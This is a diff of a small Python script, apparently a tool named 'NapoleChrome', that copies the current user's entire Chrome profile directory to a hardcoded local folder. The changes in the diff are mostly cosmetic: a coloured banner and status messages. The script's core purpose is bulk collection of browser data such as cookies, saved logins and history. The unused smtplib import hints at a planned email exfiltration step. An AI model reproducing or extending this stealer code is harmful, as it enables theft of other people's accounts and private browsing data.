@@ -1,14 +1,22 @@
-import shutil, os, smtplib
+import shutil, os, smtplib, colorama
 #from email.message import EmailMessage
 
-print(" _______                       .__                .__                                 ")
-print(" \      \ _____  ______   ____ |  |   ____   ____ |  |_________  ____   _____   ____  ")
-print(" /   |   \\__  \ \____ \ /  _ \|  | _/ __ \_/ ___\|  |  \_  __ \/  _ \ /     \_/ __ \ ")
-print("/    |    \/ __ \|  |_> >  <_> )  |_\  ___/\  \___|   Y  \  | \(  <_> )  Y Y  \  ___/ ")
-print("\____|__  (____  /   __/ \____/|____/\___  >\___  >___|  /__|   \____/|__|_|  /\___  >")
-print("        \/     \/|__|                    \/     \/     \/                   \/     \/ ")
+print(colorama.Fore.BLUE + '''
+
+ _   _                   _      _____ _                              
+| \ | |                 | |    /  __ \ |                             
+|  \| | __ _ _ __   ___ | | ___| /  \/ |__  _ __ ___  _ __ ___   ___ 
+| . ` |/ _` | '_ \ / _ \| |/ _ \ |   | '_ \| '__/ _ \| '_ ` _ \ / _ \\
+| |\  | (_| | |_) | (_) | |  __/ \__/\ | | | | | (_) | | | | | |  __/
+\_| \_/\__,_| .__/ \___/|_|\___|\____/_| |_|_|  \___/|_| |_| |_|\___|
+            | |                                                      
+            |_|                                                      
+
+''')
+
+print(colorama.Fore.YELLOW + "Copying the files...")
 
 src = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome"
-dst = input("Output directory: ")
 
-shutil.copytree(src, dst + r"\Chrome")
+shutil.copytree(src, "a" + r"\Chrome")
+print(colorama.Fore.GREEN + "Process succed")
